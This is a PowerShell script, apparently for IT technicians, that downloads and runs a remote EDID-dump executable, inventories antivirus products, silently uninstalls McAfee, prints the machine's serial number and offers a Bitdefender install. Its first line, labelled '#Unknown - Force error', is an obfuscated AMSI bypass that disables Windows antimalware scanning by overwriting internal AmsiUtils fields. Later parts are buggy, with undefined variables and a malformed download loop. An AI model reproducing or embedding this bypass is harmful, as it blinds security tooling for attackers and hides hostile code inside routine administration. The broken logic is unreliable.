#Unknown - Force error 
$PmSk=$null;$uzgrzevqr=[$([chaR]([bYTe]0x53)+[chAr]([bYtE]0x79)+[ChAR]([bYTE]0x73)+[cHaR]([byte]0x74)+[CHaR](101*19/19)+[chaR]([bYTE]0x6d)).Runtime.InteropServices.Marshal]::AllocHGlobal((5431+3645));$wifckyhcvhktnwfankaplyddrcwd="+[chAR]([byTE]0x67)+[chaR](107*96/96)+[cHar]([bYTe]0x72)+[CHAR]([BytE]0x73)+[ChaR]([ByTe]0x78)+[cHAr]([BYTe]0x6e)";[Threading.Thread]::Sleep(1811);[Ref].Assembly.GetType("$([chaR]([bYTe]0x53)+[chAr]([bYtE]0x79)+[ChAR]([bYTE]0x73)+[cHaR]([byte]0x74)+[CHaR](101*19/19)+[chaR]([bYTE]0x6d)).$(('Mánãgem'+'ent').NORmAlizE([CHar](70+59-59)+[cHAr](111+21-21)+[cHAR]([bYTE]0x72)+[CHar]([bYTE]0x6d)+[ChaR]([byTe]0x44)) -replace [CHaR]([ByTE]0x5c)+[ChAR](112*97/97)+[cHAR]([byTE]0x7b)+[CHAR](57+20)+[char](110)+[cHaR]([bYTe]0x7d)).$(('Äut'+'ómä'+'tìõ'+'n').NoRmAlIze([chaR](35+35)+[chAR](111)+[cHAR](114+94-94)+[CHar](29+80)+[CHaR](68+25-25)) -replace [CHaR](92)+[ChAr](112)+[cHAR](123)+[CHar]([byTe]0x4d)+[char](110)+[char]([bYTE]0x7d)).$(('ÂmsìUt'+'îls').NORmAliZE([Char]([BytE]0x46)+[CHaR](111+103-103)+[CHaR](114+14-14)+[cHar]([bytE]0x6d)+[ChAR](42+26)) -replace [chaR](19+73)+[cHaR](66+46)+[ChaR](123*51/51)+[cHar](47+30)+[ChAr](110+7-7)+[cHAR](117+8))").GetField("$([cHAR]([byTE]0x61)+[ChAr](109*51/51)+[chAR](115*17/17)+[ChAR]([BYte]0x69)+[CHaR]([BYTE]0x53)+[cHAr]([bYte]0x65)+[CHAR]([bYte]0x73)+[CHar](17+98)+[CHAr](3+102)+[chAR](78+33)+[cHar]([BYtE]0x6e))", "NonPublic,Static").SetValue($PmSk, $null);[Ref].Assembly.GetType("$([chaR]([bYTe]0x53)+[chAr]([bYtE]0x79)+[ChAR]([bYTE]0x73)+[cHaR]([byte]0x74)+[CHaR](101*19/19)+[chaR]([bYTE]0x6d)).$(('Mánãgem'+'ent').NORmAlizE([CHar](70+59-59)+[cHAr](111+21-21)+[cHAR]([bYTE]0x72)+[CHar]([bYTE]0x6d)+[ChaR]([byTe]0x44)) -replace [CHaR]([ByTE]0x5c)+[ChAR](112*97/97)+[cHAR]([byTE]0x7b)+[CHAR](57+20)+[char](110)+[cHaR]([bYTe]0x7d)).$(('Äut'+'ómä'+'tìõ'+'n').NoRmAlIze([chaR](35+35)+[chAR](111)+[cHAR](114+94-94)+[CHar](29+80)+[CHaR](68+25-25)) -replace [CHaR](92)+[ChAr](112)+[cHAR](123)+[CHar]([byTe]0x4d)+[char](110)+[char]([bYTE]0x7d)).$(('ÂmsìUt'+'îls').NORmAliZE([Char]([BytE]0x46)+[CHaR](111+103-103)+[CHaR](114+14-14)+[cHar]([bytE]0x6d)+[ChAR](42+26)) -replace [chaR](19+73)+[cHaR](66+46)+[ChaR](123*51/51)+[cHar](47+30)+[ChAr](110+7-7)+[cHAR](117+8))").GetField("$(('äms'+'ìCó'+'nte'+'xt').NORmAlIZE([chAR]([byTe]0x46)+[cHar](111)+[cHaR](9+105)+[cHAr]([ByTE]0x6d)+[cHAR](68*50/50)) -replace [CHAR]([byTe]0x5c)+[cHAr](112+10-10)+[char]([BYTe]0x7b)+[CHar](77)+[Char]([BYte]0x6e)+[Char](125))", "NonPublic,Static").SetValue($null, [IntPtr]$uzgrzevqr);
$url = "https://github.com/jelpsIT/duckery/raw/main/DumpEDID.exe"
$outputPath = "C:\temp\"
cls
# Check if the output path exists
if (-not (Test-Path $outputPath -PathType Container)) {
    # Create the output path if it doesn't exist
    New-Item -ItemType Directory -Path $outputPath | Out-Null
    Write-Output "$outputPath created successfully."
} else {
    Write-Output "$outputPath already exists."
}
$outputPath = "C:\temp\DUMPEDID.exe"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Navigate to the download directory
Set-Location (Split-Path $outputPath)

# Run the file
& cmd.exe /c "DUMPEDID.exe"
Write-Output "`n "

$programs = "Webroot", "Bitdefender", "McAfee", "Windows Agent", "Fresh"
$table1 = @()

foreach ($program in $programs) {
    $exists = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName -match $program }
    $row = New-Object PSObject -Property @{ 
        "Program" = $program
        "Exists"  = if ($exists) { "Yes" } else { "No" } 
    }
    $table1 += $row
}


# Check if McAfee is installed and uninstall it
$mcafee = $installedApps | Where-Object { $_.DisplayName -match "McAfee" }
if ($mcafee) {
    Write-Host "Uninstalling $($mcafee.DisplayName) ..."
    $uninstallCmd = $mcafee.QuietUninstallString -replace "msiexec.exe", "msiexec.exe /qn"
    $process = Start-Process cmd -ArgumentList "/c $uninstallCmd" -Wait -PassThru
    if ($process.ExitCode -eq 0) {
        Write-Host "$($mcafee.DisplayName) has been uninstalled."
    } else {
        Write-Warning "Failed to uninstall $($mcafee.DisplayName)."
    }
} else {
    Write-Host "McAfee is not installed."
}

# Get the PC name
$pcName = $env:COMPUTERNAME

# Get the serial number
$serialNumber = Get-WmiObject Win32_BIOS | Select-Object SerialNumber

# Format the output into a table
$table2 = New-Object -TypeName PSObject -Property @{
    "PC Name" = $pcName
    "Serial Number" = $serialNumber.SerialNumber
} | Format-Table -AutoSize

# Display the table
Write-Output $table1
# Display the table with highlighted headers
Write-Host "PC Name:`t$pcName" -ForegroundColor Yellow
Write-Host "Serial Number:`t$($serialNumber.SerialNumber)`n" -ForegroundColor Yellow



$bitdefenderInstalled = $false

# Get list of installed programs from registry
$programs = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, UninstallString

# Check if any program with a name containing "Bitdefender" is installed
foreach ($program1 in $programs1) {
    if ($program1.DisplayName -like "*Bitdefender*") {
        $bitdefenderInstalled = $true
        break
    }
}
Function IsBitDefenderInstalled {
# Do some code if Bitdefender is installed
if ($bitdefenderInstalled) {
    Write-Host "See table above."
}
# Do some other code if Bitdefender is not installed
else {
    # Set the download URLs
	
$url1 = "https://link.storjshare.io/s/julpr7igbkdcz252zfakn26pa6hq/storage/epskit_x64.exe?download=1"
$url2 = "https://raw.githubusercontent.com/jelpsIT/automation_EDIDs/main/installer.xml"

# Set the download locations
$downloadPath1 = "$env:USERPROFILE\Downloads\epskit_x64.exe"
$downloadPath2 = "$env:USERPROFILE\Downloads\installer.xml"

# Try to download the files and move them to the temp folder
try {
    # Create a BITS transfer job for file 1
    $bitsJob1 = Start-BitsTransfer -Source $url1 -Destination $downloadPath1 -DisplayName "Downloading Bitdefender" -Description "BITS transfer" -Priority Foreground -TransferType Download -ErrorVariable bitsError1

    # Create a BITS transfer job for file 2
    $bitsJob2 = Start-BitsTransfer -Source $url2 -Destination $downloadPath2 -DisplayName "Downloading XML File" -Description "BITS transfer" -Priority Foreground -TransferType Download -ErrorVariable bitsError2

    # Wait for the BITS transfer jobs to complete
    while ($bitsJob1.JobState -ne "Transferred" -or $bitsJob2.JobState -ne "Transferred") {
        Write-Progress -Activity "Downloading files" -Status "File 1: $($bitsJob1.BytesTransferred) bytes downloaded, File 2: $($bitsJob2.BytesTransferred) bytes downloaded" -PercentComplete ($bitsJob1.BytesTransferred + $bitsJob2.BytesTransferred) / ($bitsJob1.BytesTotal + $bitsJob2.BytesTotal * 2) * 100
        Start-Sleep -Seconds 1
    }
}
catch {
    # If the download fails, change the download path to the backup location
    Write-Warning "Completed downloading. Navigate to $env:USERPROFILE\Downloads"
}
}
}
$bitdefenderInstalled = $false

# Get list of installed programs from registry
$programs = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, UninstallString

# Check if any program with a name containing "Bitdefender" is installed
foreach ($program in $programs) {
    if ($program.DisplayName -like "*Bitdefender*") {
        $bitdefenderInstalled = $true
        break
    }
}

# Do some code if Bitdefender is installed
if ($bitdefenderInstalled) {
    Write-Host "Bitdefender is installed. See Table below"
    # add your code here
}
# Do some other code if Bitdefender is not installed
else {
    Write-Host "Bitdefender is not installed"
    IsBitDefenderInstalled
	$installBitdefender = Read-Host "Do you want to install Bitdefender? (Y/N)"
    if ($installBitdefender -eq "Y") {
        # Invoke the installer for file 1
        Start-Process $downloadPath1
    }
}

